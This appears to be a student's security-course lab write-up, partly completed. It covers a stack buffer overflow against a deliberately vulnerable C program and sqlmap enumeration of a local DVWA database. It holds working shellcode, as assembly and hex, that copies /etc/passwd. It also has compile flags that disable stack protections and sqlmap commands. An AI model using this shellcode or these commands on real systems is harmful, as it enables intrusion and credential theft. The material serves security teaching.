# Lab #1,22110054, Nguyen Huu Nghi, INSE330380E_01FIE
# Task 1: Software buffer overflow attack

Given a vulnerable C program 
```
#include <stdio.h>
#include <string.h>
void redundant_code(char* p)
{
    local[256];
    strncpy(local,p,20);
	printf("redundant code\n");
}
int main(int argc, char* argv[])
{
	char buffer[16];
	strcpy(buffer,argv[1]);
	return 0;
}
```
and a shellcode source in asm. This shellcode copy /etc/passwd to /tmp/pwfile
```
global _start
section .text
_start:
    xor eax,eax
    mov al,0x5
    xor ecx,ecx
    push ecx
    push 0x64777373 
    push 0x61702f63
    push 0x74652f2f
    lea ebx,[esp +1]
    int 0x80

    mov ebx,eax
    mov al,0x3
    mov edi,esp
    mov ecx,edi
    push WORD 0xffff
    pop edx
    int 0x80
    mov esi,eax

    push 0x5
    pop eax
    xor ecx,ecx
    push ecx
    push 0x656c6966
    push 0x74756f2f
    push 0x706d742f
    mov ebx,esp
    mov cl,0102o
    push WORD 0644o
    pop edx
    int 0x80

    mov ebx,eax
    push 0x4
    pop eax
    mov ecx,edi
    mov edx,esi
    int 0x80

    xor eax,eax
    xor ebx,ebx
    mov al,0x1
    mov bl,0x5
    int 0x80

```
**Question 1**:
- Compile asm program and C program to executable code. 
- Conduct the attack so that when C program is executed, the /etc/passwd file is copied to /tmp/pwfile. You are free to choose Code Injection or Environment Variable approach to do. 
- Write step-by-step explanation and clearly comment on instructions and screenshots that you have made to successfully accomplished the attack.
**Answer 1**: Must conform to below structure:

**Stack frame:** <br>
![image](https://github.com/user-attachments/assets/4bc7f91d-1c22-4b16-b8f3-23099c098517)


Compile asm program and C program to executable code <br>

Use command:
``` 
    nasm -g -f elf shell.asm
    ld -m elf-i386 -o shell shell.o
    gcc -g lab1.c -o lab1.out -fno-stack-protector -mpreferred-stack-boundary=2
```
![image](https://github.com/user-attachments/assets/433fbe38-0093-47b8-b6db-6727b69bf308)
Take asembly of file asm
<br>
Use command:
```
for i in $(objdump -d shell.o |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo
```
Kết quả:
`\x31\xc0\xb0\x05\x31\xc9\x51\x68\x73\x73\x77\x64\x68\x63\x2f\x70\x61\x68\x2f\x2f\x65\x74\x8d\x5c\x24\x01\xcd\x80\x89\xc3\xb0\x03\x89\xe7\x89\xf9\x66\x6a\xff\x5a\xcd\x80\x89\xc6\x6a\x05\x58\x31\xc9\x51\x68\x66\x69\x6c\x65\x68\x2f\x6f\x75\x74\x68\x2f\x74\x6d\x70\x89\xe3\xb1\x42\x66\x68\xa4\x01\x5a\xcd\x80\x89\xc3\x6a\x04\x58\x89\xf9\x89\xf2\xcd\x80\x31\xc0\x31\xdb\xb0\x01\xb3\x05\xcd\x80` <br>
![image](https://github.com/user-attachments/assets/4353a203-c772-4cfe-a711-f02a4c350a4e)
<br>
To allow excute code on stack 
Use command
```
gcc -g lab1.c -o lab1.out -fno-stack-protector -mpreferred-stack-boundary=2 -z exestack
```
Create a link between file:
Use command
```
sudo ln -sf /bin/zsh /bin/shell
```
Use gdb for debuging:
Use command:
```
bof$ gdb -q lab1.out
```

![image](https://github.com/user-attachments/assets/5cfcb52f-5106-4f72-973f-33dca0e29522)

output screenshot (optional)

**Conclusion**: comment text about the screenshot or simply answered text for the question

# Task 2: Attack on database of DVWA
- Install dvwa (on host machine or docker container)
- Make sure you can login with default user
- Install sqlmap
- Write instructions and screenshots in the answer sections. Strictly follow the below structure for your writeup. 

**Question 1**: Use sqlmap to get information about all available databases
**Answer 1**:
Use this command to Get Available Databases:
```
python sqlmap.py -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit#" --dbs
```
![image](https://github.com/user-attachments/assets/faeda253-54a7-4bfd-ab56-683ab3b8a800)

**Question 2**: Use sqlmap to get tables, users information
**Answer 2**:
Use this command get tables, users information
```
 python sqlmap.py -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit#" -D dvwa --tables
```
**Question 3**: Make use of John the Ripper to disclose the password of all database users from the above exploit
**Answer 3**:




